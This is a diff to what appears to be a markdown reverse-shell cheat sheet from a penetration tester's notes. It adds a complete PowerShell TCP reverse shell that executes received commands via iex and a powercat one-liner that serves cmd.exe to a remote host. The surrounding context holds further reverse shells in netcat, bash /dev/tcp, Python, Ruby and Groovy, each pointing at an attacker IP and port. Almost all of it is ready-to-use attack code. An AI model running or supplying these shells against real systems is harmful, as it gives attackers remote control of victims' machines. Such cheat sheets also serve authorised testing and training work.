@@ -11,9 +11,10 @@ Netcat with -e
 ```bash
 nc -e /bin/sh 10.0.0.1 1234
 ```
+
 ## Bash
 
-```
+```bash
 #!/bin/bash
 bash -c 'bash -i >& /dev/tcp/$IP/$PORT 0>&1'
 ```
@@ -34,6 +35,7 @@ os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
 p=subprocess.call(["/bin/sh", "-i"])
 ```
+
 ## Perl
 
 ```perl
@@ -64,4 +66,27 @@ ruby -rsocket -e'f=TCPSocket.open("$IP",$PORT).to_i;exec sprintf("/bin/sh -i <&%
 r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/$IP/$PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
+```
+
+## Powershell 
+```powershell
+$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10', 1337);
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
+{
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+    $sendback = (iex $data 2>&1 | Out-String );
+    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte,0,$sendbyte.Length);
+    $stream.Flush();
+}
+$client.Close();
+```
+
+## Powercat
+More Powercat related at [[Powercat-Cheatsheet]]
+```powershell
+powercat -c 10.10.10.10 -p 54321 -e cmd.exe
 ```
